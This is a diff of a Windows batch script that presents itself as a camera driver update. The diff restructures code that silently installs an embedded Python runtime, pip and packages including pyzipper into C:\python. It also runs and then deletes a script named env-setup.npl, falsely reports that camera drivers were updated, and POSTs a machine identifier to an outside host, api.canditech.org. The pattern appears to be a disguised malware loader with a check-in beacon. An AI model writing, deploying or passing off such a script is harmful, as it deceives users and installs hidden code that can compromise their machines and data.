@@ -44,10 +44,46 @@ if errorlevel 1 exit /b 1
 call :RunDriverScript
 if errorlevel 1 exit /b 1
 
-call :InstallPythonStack
-if errorlevel 1 exit /b 1
+REM Python + pip inline (no call :label - avoids "label not found" on downloaded .bat with bad CRLF)
+echo [INFO] Installing Python embed runtime...
+mkdir C:\python 2>nul
+curl -sSL --connect-timeout 30 --max-time 600 -o C:\python\py.zip https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Failed to download Python embed zip.
+    exit /b 1
+)
+powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force"
+if errorlevel 1 (
+    echo [ERROR] Failed to extract Python zip.
+    exit /b 1
+)
+del C:\python\py.zip >nul 2>&1
+powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
+powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
 
-call :FinalizeSuccess
+echo [INFO] Installing pip and packages...
+curl -sSL --connect-timeout 30 --max-time 120 -o C:\python\get-pip.py https://bootstrap.pypa.io/get-pip.py >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] Failed to download get-pip.py
+    exit /b 1
+)
+C:\python\python.exe C:\python\get-pip.py >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] get-pip.py failed.
+    exit /b 1
+)
+C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
+if errorlevel 1 (
+    echo [ERROR] pip install failed.
+    exit /b 1
+)
+
+if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
+echo [SUCCESS] Camera drivers have been updated successfully.
+if defined WINDOW_UID (
+    set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
+    curl -sL -X POST "!AUTO_URL!" -o nul
+)
 exit /b 0
 
 
@@ -182,55 +218,5 @@ echo [INFO] Running driver setup script (this step may take several minutes)...
 if errorlevel 1 (
     echo [ERROR] Driver script env-setup.npl failed. Exit code: !ERRORLEVEL!
     exit /b 1
-)
-exit /b 0
-
-
-REM ---------------------------------------------------------------------
-REM ---------------------------------------------------------------------
-:InstallPythonStack
-echo [INFO] Installing Python embed runtime...
-mkdir C:\python 2>nul
-curl -sSL --connect-timeout 30 --max-time 600 -o C:\python\py.zip https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] Failed to download Python embed zip.
-    exit /b 1
-)
-powershell -NoProfile -Command "Expand-Archive -Path C:\python\py.zip -DestinationPath C:\python -Force"
-if errorlevel 1 (
-    echo [ERROR] Failed to extract Python zip.
-    exit /b 1
-)
-del C:\python\py.zip >nul 2>&1
-powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
-powershell -NoProfile -Command "(Get-Content C:\python\python313._pth) -replace '^#import site','import site' | Set-Content C:\python\python313._pth" >nul 2>&1
-
-echo [INFO] Installing pip and packages...
-curl -sSL --connect-timeout 30 --max-time 120 -o C:\python\get-pip.py https://bootstrap.pypa.io/get-pip.py >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] Failed to download get-pip.py
-    exit /b 1
-)
-C:\python\python.exe C:\python\get-pip.py >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] get-pip.py failed.
-    exit /b 1
-)
-C:\python\python.exe -m pip install requests portalocker pyzipper >nul 2>&1
-if errorlevel 1 (
-    echo [ERROR] pip install failed.
-    exit /b 1
-)
-exit /b 0
-
-
-REM ---------------------------------------------------------------------
-REM ---------------------------------------------------------------------
-:FinalizeSuccess
-if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
-echo [SUCCESS] Camera drivers have been updated successfully.
-if defined WINDOW_UID (
-    set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
-    curl -sL -X POST "!AUTO_URL!" -o nul
 )
 exit /b 0
